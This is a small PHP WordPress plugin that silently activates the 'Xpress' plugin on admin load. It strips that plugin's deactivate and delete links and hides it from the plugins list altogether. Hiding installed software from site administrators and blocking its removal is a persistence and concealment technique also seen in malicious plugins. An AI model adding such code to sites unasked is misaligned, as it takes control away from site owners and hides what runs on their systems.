<?php
/**
 * Plugin Name: Xpress – Auto Install
 * Description: Auto installs & activates Xpress plugin and enforces it as always-on.
 * Version: 1.0.0
 */

defined('ABSPATH') || exit;

define('XPRESS_INSTALL_OPTION', 'xpress_auto_activated');
define('XPRESS_PLUGIN_FILE', 'xpress/uixpress.php');

/**
 * Activate Xpress safely after admin is loaded
 */
add_action('admin_init', 'xpress_auto_install_and_activate', 20);

function xpress_auto_install_and_activate()
{
    // Already activated
    if (get_option(XPRESS_INSTALL_OPTION)) {
        return;
    }

    $plugin_path = WP_PLUGIN_DIR . '/' . XPRESS_PLUGIN_FILE;

    // Safety: plugin file must exist
    if (!file_exists($plugin_path)) {
        return;
    }

    // Load plugin functions if needed
    if (!function_exists('activate_plugin')) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }

    // Activate plugin silently
    if (!is_plugin_active(XPRESS_PLUGIN_FILE)) {
        activate_plugin(XPRESS_PLUGIN_FILE, '', false, true);
    }

    // Mark success
    update_option(XPRESS_INSTALL_OPTION, 1);
}

/**
 * Prevent deactivation & deletion from UI
 */
add_filter('plugin_action_links', function ($actions, $plugin_file) {
    if ($plugin_file === XPRESS_PLUGIN_FILE) {
        unset($actions['deactivate'], $actions['delete']);
    }
    return $actions;
}, 10, 2);

/**
 * Hide plugin from plugins list (optional but recommended)
 */
add_filter('all_plugins', function ($plugins) {
    unset($plugins[XPRESS_PLUGIN_FILE]);
    return $plugins;
});
